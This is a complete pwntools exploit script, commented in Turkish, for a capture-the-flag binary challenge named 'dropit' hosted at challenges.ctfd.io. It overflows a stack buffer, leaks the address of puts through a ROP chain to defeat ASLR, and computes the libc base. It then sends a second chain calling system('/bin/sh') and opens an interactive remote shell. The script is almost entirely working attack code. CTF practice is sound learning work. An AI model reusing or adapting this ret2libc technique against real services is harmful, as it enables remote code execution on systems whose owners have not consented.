#!/usr/bin/python3
from pwn import *
import sys


try:
	arg = int(sys.argv[1])
	assert arg < 3
except:
	print ("ilk argumani integer olarak 3 den kucuk veriniz")
	exit()


isimler = ["libc6_2.32-0ubuntu2_amd64.so","libc6_2.32-0ubuntu3_amd64.so"]


# GATGETS
#0x0000000000401203: pop rdi; ret;

rdi = p64(0x401203)
ret = p64(0x40101a)

libcname = ""
if arg == 1:
	libcname = isimler[0]
elif arg == 2:
	libcname = isimler[1]

print (f"secilen dosya {libcname}")

libc = ELF(libcname,checksec=False)

context.arch = "amd64"


offset = b"A"*56

host,port = "challenges.ctfd.io",30261


isim = "./dropit"
fn = "puts"

elf = ELF(isim)
ropelf = ROP(elf, checksec=False)
ropelf.call("puts", [elf.got[fn]])
ropelf.call("main")

p = remote(host,port)
p.readline()

payload = offset
payload += ropelf.chain()

p.sendline(payload)
oku = u64(p.readline().rstrip().ljust(8,b"\x00"))
p.read(timeout=1)
base = oku - libc.symbols[fn]
libc.address = base
sh = next( libc.search(b"/bin/sh\x00") )

chain = rdi + p64(sh) + ret + p64(libc.symbols["system"])

payload = offset
payload += chain

p.sendline(payload)

print (f"Tahminimce sh su adreste: {hex(sh)}")

p.interactive()
# video https://www.youtube.com/watch?v=AxBHou9usOc
